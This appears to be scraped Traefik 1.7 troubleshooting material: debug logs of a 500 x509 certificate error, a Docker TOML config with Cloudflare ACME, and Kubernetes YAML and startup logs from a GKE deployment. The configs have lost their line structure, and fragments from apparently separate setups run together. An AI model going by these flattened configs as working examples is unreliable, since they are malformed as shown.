time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" forwardurl=" " request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 8.121596ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="new attempt 3 for request: /favicon.ico"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}" forwardurl=" "
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-11-19t12:16:23z" level=debug msg="\'500 internal server error\' caused by: x509: certificate signed by unknown authority"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 500, length: 21, duration: 8.799237ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unms.mydomain.com"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"https\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"192.168.1.76:6443\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
time="2018-11-19t12:16:23z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/favicon.ico\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"image/webp,image/apng,image/*,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"en-us,en;q=0.9\\"],\\"cookie\\":[\\"_ga=ga1.2.184097280.1532435087; _gid=ga1.2.1185789528.1542629299\\"],\\"dnt\\":[\\"1\\"],\\"referer\\":[\\" "],\\"user-agent\\":[\\"mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/70.0.3538.102 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"unms.mydomain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.1.1:56707\\",\\"requesturi\\":\\"/favicon.ico\\",\\"tls\\":null}"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] checknewversion = true [acme]
#caserver = " "
email = "********"
storage = "/acme.json"
entrypoint = "https"
acmelogging = true
ondemand = true
onhostrule = true [acme.dnschallenge] provider = "cloudflare" delaybeforecheck = 0 [[acme.domains]] main = "*.some.subdomain.tld" sans = ["some.subdomain.tld"] [api]
entrypoint = "traefik"
dashboard = true [docker] endpoint = "unix:///var/run/docker.sock" domain = "docker.localhost" watch = true exposedbydefault = true usebindportip = true [file] filename = "rules.toml"
watch = true
cloudflare_email | ****
cloudflare_api_key | **** its running on a ubuntu server 18.04.
- gke v1.11.2-gke.15
- traefik in the `prod` namespace
- cert-manager for acme wildcard certificates
- spinnaker-api ingress in the `spinnaker` namespace ```toml loglevel = "info"
sendanonymoususage = true
defaultentrypoints = ["http","https"]
[entrypoints.http] address = ":8080" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " permanent = true [entrypoints.https] address = ":8443" compress = true [entrypoints.https.tls] minversion = "versiontls11" ciphersuites = [ "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_rsa_with_aes_256_gcm_sha384", "tls_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_128_cbc_sha256", "tls_rsa_with_aes_256_cbc_sha", "tls_rsa_with_aes_128_cbc_sha", ] [entrypoints.traefik] address = ":8888" [kubernetes] [api] entrypoint = "traefik" dashboard = true [api.statistics] recenterrors = 10
``` ```yaml
# traefik.traefik
# traefik.traefik-dashboard
apiversion: rbac.authorization.k8s.io/v1beta1
kind: clusterrole
metadata: labels: ksonnet.io/component: traefik.traefik name: traefik
rules: - apigroups: - '' resources: - pods - services - endpoints - secrets verbs: - get - list - watch - apigroups: - extensions resources: - ingresses verbs: - get - list - watch
apiversion: rbac.authorization.k8s.io/v1beta1
kind: clusterrolebinding
metadata: labels: ksonnet.io/component: traefik.traefik name: traefik
roleref: apigroup: rbac.authorization.k8s.io kind: clusterrole name: traefik
subjects: - kind: serviceaccount name: traefik namespace: prod
apiversion: v1
data: traefik.toml: "loglevel = \\"info\\"\ sendanonymoususage = true\ defaultentrypoints = [\\"http\\",\\"https\\"]\ [entrypoints.http]\ address = \\":8080\\"\ compress = true\ \ [entrypoints.http.redirect]\ regex = \\"^ "\ replacement = \\" "\ permanent = true\ \ [entrypoints.https]\ address = \\":8443\\"\ \\ compress = true\ \ [entrypoints.https.tls]\ minversion = \\"versiontls11\\"\ \\ ciphersuites = [\ \\"tls_ecdhe_rsa_with_aes_256_gcm_sha384\\",\ \\"tls_ecdhe_rsa_with_aes_128_gcm_sha256\\",\ \\ \\"tls_ecdhe_rsa_with_chacha20_poly1305\\",\ \\"tls_ecdhe_rsa_with_aes_128_cbc_sha256\\",\ \\ \\"tls_ecdhe_rsa_with_aes_256_cbc_sha\\",\ \\"tls_ecdhe_rsa_with_aes_128_cbc_sha\\",\ \\ \\"tls_rsa_with_aes_256_gcm_sha384\\",\ \\"tls_rsa_with_aes_128_gcm_sha256\\",\ \\ \\"tls_rsa_with_aes_128_cbc_sha256\\",\ \\"tls_rsa_with_aes_256_cbc_sha\\",\ \\ \\"tls_rsa_with_aes_128_cbc_sha\\",\ ]\ \ [entrypoints.traefik]\ address = \\":8888\\" \ \ [kubernetes]\ \ [api]\ entrypoint = \\"traefik\\"\ \\ dashboard = true \ \ [api.statistics]\ recenterrors = 10\ "
kind: configmap
metadata: labels: ksonnet.io/component: traefik.traefik name: traefik-config namespace: prod
apiversion: v1
kind: serviceaccount
metadata: labels: ksonnet.io/component: traefik.traefik name: traefik namespace: prod
apiversion: v1
kind: service
metadata: labels: app: traefik ksonnet.io/component: traefik.traefik name: traefik namespace: prod
spec: externaltrafficpolicy: cluster loadbalancerip: 1.1.1.94 ports: - name: http port: 80 protocol: tcp targetport: 8080 - name: https port: 443 protocol: tcp targetport: 8443 selector: app: traefik type: loadbalancer
apiversion: v1
kind: service
metadata: labels: app: traefik ksonnet.io/component: traefik.traefik-dashboard name: traefik-dashboard namespace: prod
spec: ports: - port: 80 targetport: 8888 selector: app: traefik type: clusterip
apiversion: apps/v1
kind: deployment
metadata: labels: app: traefik ksonnet.io/component: traefik.traefik name: traefik namespace: prod
spec: replicas: 1 selector: matchlabels: app: traefik template: metadata: labels: app: traefik spec: containers: - image: traefik:1.7.4 livenessprobe: failurethreshold: 3 initialdelayseconds: 10 periodseconds: 10 successthreshold: 1 tcpsocket: port: 8080 timeoutseconds: 2 name: traefik ports: - containerport: 8080 name: http - containerport: 8443 name: https - containerport: 8888 name: admin readinessprobe: failurethreshold: 1 initialdelayseconds: 10 periodseconds: 10 successthreshold: 1 tcpsocket: port: 8080 timeoutseconds: 2 resources: limits: cpu: 100m memory: 70mi requests: cpu: 100m memory: 30mi volumemounts: - mountpath: /etc/traefik name: config-volume serviceaccountname: traefik terminationgraceperiodseconds: 60 volumes: - configmap: name: traefik-config name: config-volume
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: ingress.kubernetes.io/auth-secret: traefik-dashboard-admin-credentials ingress.kubernetes.io/auth-type: basic kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/preserve-host: 'true' traefik.ingress.kubernetes.io/priority: '100' labels: app: traefik-dashboard ksonnet.io/component: traefik.traefik-dashboard name: traefik-dashboard namespace: prod
spec: rules: - host: traefik.mydomain.com http: paths: - backend: servicename: traefik-dashboard serviceport: 80 tls: - hosts: - traefik.mydomain.com secretname: cert-wildcard-mydomain.com
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-11-12t16:42:15z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2018-11-12t16:42:15z" level=info msg="traefik version v1.7.4 built on 2018-10-30_10:44:30am"
time="2018-11-12t16:42:15z" level=info msg="\ stats collection is enabled.\ many thanks for contributing to traefik\'s improvement by allowing us to receive anonymous information from your configuration.\ help us improve traefik by leaving this feature on :)\ more details on: #collected-data\ "
time="2018-11-12t16:42:18z" level=info msg="preparing server traefik &{address::8888 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-11-12t16:42:18z" level=info msg="preparing server http &{address::8080 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-11-12t16:42:18z" level=info msg="preparing server https &{address::8443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-11-12t16:42:18z" level=info msg="starting server on :8888"
time="2018-11-12t16:42:18z" level=info msg="starting server on :8080"
time="2018-11-12t16:42:19z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-11-12t16:42:19z" level=info msg="starting server on :8443"
time="2018-11-12t16:42:19z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":null}"
time="2018-11-12t16:42:19z" level=info msg="ingress label selector is: \\"\\""
time="2018-11-12t16:42:19z" level=info msg="creating in-cluster provider client"
time="2018-11-12t16:42:19z" level=error msg="error configuring tls for ingress prod/traefik-dashboard: secret prod/cert-wildcard-mydomain.com does not exist"
time="2018-11-12t16:42:20z" level=error msg="error configuring tls for ingress prod/traefik-dashboard: secret prod/cert-wildcard-mydomain.com does not exist"
time="2018-11-12t16:42:20z" level=error msg="error configuring tls for ingress prod/traefik-dashboard: secret prod/cert-wildcard-mydomain.com does not exist"
time="2018-11-12t16:42:20z" level=error msg="error configuring tls for ingress prod/traefik-dashboard: secret prod/cert-wildcard-mydomain.com does not exist"
time="2018-11-12t16:42:21z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:42:21z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:42:21z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:42:25z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:42:25z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:42:25z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:42:30z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:42:30z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:42:30z" level=info msg="server configuration reloaded on :8443" time="2018-11-12t16:48:19z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:19z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:19z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:19z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:19z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:21z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:21z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:21z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:21z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:21z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:30z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:30z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:30z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:30z" level=info msg="server configuration reloaded on :8888"
time="2018-11-12t16:48:30z" level=info msg="server configuration reloaded on :8080"
time="2018-11-12t16:48:33z" level=warning msg="into entrypoint http, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:33z" level=warning msg="into entrypoint https, try to add certificate for domains which already have this certificate (*.mydomain.com,mydomain.com)
the new certificate will not be append to the entrypoint."
time="2018-11-12t16:48:33z" level=info msg="server configuration reloaded on :8443"
time="2018-11-12t16:48:33z" level=info msg="server configuration reloaded on :8888"
